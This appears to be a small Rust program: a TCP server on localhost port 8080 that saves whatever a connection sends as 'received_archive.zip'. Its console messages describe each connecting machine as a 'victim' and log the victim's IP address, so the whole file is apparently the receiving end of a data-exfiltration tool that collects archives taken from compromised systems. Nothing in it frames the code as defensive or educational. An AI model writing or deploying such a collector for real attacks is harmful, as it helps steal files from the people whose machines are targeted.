fn receive_file(mut stream: std::net::TcpStream) -> std::io::Result<()> {
    use std::io::Read;
    use std::fs::File;

    let mut buffer = Vec::new();
    stream.read_to_end(&mut buffer)?;

    let mut file = File::create("received_archive.zip")?;
    use std::io::Write;
    file.write_all(&buffer)?;

    println!("File received and saved as received_archive.zip");
    Ok(())
}


fn main() {
    use std::net::TcpListener;

    let listener = TcpListener::bind("127.0.0.1:8080").unwrap();

    println!("Server listening on port 8080");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                println!("New connection established from victim.");
                println!("Victim IP Address: {}", stream.peer_addr().unwrap());

                // Read the file once
                if let Err(e) = receive_file(stream) {
                    eprintln!("Failed to receive file: {}", e);
                }
            }
            Err(e) => {
                eprintln!("Connection failed: {}", e);
            }
        }
    }
}

